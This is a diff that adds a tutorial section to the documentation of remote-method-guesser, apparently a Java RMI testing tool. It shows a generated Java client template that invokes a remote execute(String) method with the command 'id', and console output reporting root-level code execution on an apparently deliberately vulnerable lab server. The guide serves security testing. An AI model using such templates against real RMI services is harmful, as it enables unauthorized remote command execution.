@@ -325,3 +325,65 @@ drwxr-xr-x 2 qtc qtc 4096 Sep 26 15:18 ISslServerSystemSample
 In the following, two of these created samples are examined in more detailed and it is shown how they can be used to validate vulnerable
 methods.
 
+
+#### IPlainServerExecuteSample
+
+The probably easiest of the above created samples is ``IPlainServerExecuteSample`` with a method signature of:
+
+```java
+java.lang.String de.qtc.rmg.IPlainServer.execute(java.lang.String)
+```
+
+Looking at the method name, the return type and the argument type, one can already guess that this method simply executes the provided argument
+as an operating system command and returns the corresponding result. The corresponding template ``IPlainServerExecuteSample.java`` contains all
+the code that is required to invoke the corresponding method. About 90% of this code are related to the connection setup and are not relevant for
+the actual usage of the template. The only really relevant part is the following:
+
+```java
+System.out.print("[+] Connecting to registry on " + remoteHost + ":" + remotePort + "... ");
+Registry registry = null;
+
+if( true ) {
+    RMIClientSocketFactory csf = new SslRMIClientSocketFactory();
+    registry = LocateRegistry.getRegistry(remoteHost, remotePort, csf);
+} else {
+    registry = LocateRegistry.getRegistry(remoteHost, remotePort);
+}
+
+System.out.println("done!");
+
+System.out.println("[+] Starting lookup on plain-server... ");
+IPlainServer stub = (IPlainServer) registry.lookup("plain-server");
+
+java.lang.String argument0 = TODO;
+
+System.out.print("[+] Invoking method execute... ");
+java.lang.String response = stub.execute(argument0);
+System.out.println("done!");
+
+System.out.println("[+] The servers response is: " + response);
+```
+
+The *Java* code displayed above is responsible for the actual method call. Whereas *remote-method-guesser* is able to
+generate most of the code automatically, it cannot reason about the arguments you want to use for the method call.
+Therefore, the generated code contains one ``TODO`` for each argument, that needs to be replaced manually. The
+variable type gives an indication what type of *Java* object is expected (a ``String`` in the above case). You
+may also want to adjust what is done with the return value of the method call. By default, it is used as part
+of a *print statement*.
+
+For the current case, where the method most likely just executes an operating system command, we can replace
+``TODO`` with ``id``. After making this change and saving the file, we can compile and execute it:
+
+```console
+[qtc@kali IPlainServerExecuteSample]$ javac IPlainServerExecuteSample.java 
+[qtc@kali IPlainServerExecuteSample]$ java IPlainServerExecuteSample 
+[+] Connecting to registry on 172.17.0.2:1090... done!
+[+] Starting lookup on plain-server... 
+[+] RMI object tries to connect to different remote host: iinsecure.dev
+[+]	Redirecting the connection back to 172.17.0.2... 
+[+]	This is done for all further requests. This message is not shown again. 
+[+] Invoking method execute... done!
+[+] The servers response is: uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+```
+
+As expected, we get code execution on the *Java RMI* server.
